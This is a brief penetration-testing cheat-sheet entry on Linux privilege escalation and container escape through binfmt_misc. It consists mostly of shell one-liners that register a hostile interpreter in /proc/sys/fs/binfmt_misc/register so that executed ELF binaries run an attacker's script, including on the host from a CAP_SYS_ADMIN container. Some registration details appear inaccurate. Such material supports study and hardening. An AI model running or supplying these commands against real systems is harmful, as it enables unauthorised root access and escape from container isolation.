# binfmt_misc privesc

`binfmt_misc` allows registering custom binary interpreters. If you can write to `/proc/sys/fs/binfmt_misc/register` (or via `mount --bind` as root), register a custom interpreter for a SUID file type, then trigger execution.

```bash
# Check if binfmt_misc is mounted
mount | grep binfmt_misc
ls /proc/sys/fs/binfmt_misc/

# If you can write to register (rare — usually needs root or CAP_SYS_ADMIN):
echo ':exploit:M:0:\x7fELF::/tmp/my_interpreter:P' > /proc/sys/fs/binfmt_misc/register
# Any ELF executed → runs /tmp/my_interpreter instead

# More common scenario: writable binfmt_misc config via privileged script
# or container with CAP_SYS_ADMIN that has binfmt_misc mounted from host
```

**Container escape via binfmt_misc** (CAP_SYS_ADMIN in container, host-mounted `/proc/sys/fs/binfmt_misc`):
```bash
# From inside container with SYS_ADMIN:
echo ':xploit:E::elf::/evil_script:OC' > /proc/sys/fs/binfmt_misc/register
# When host runs any ELF → runs /evil_script on host
```
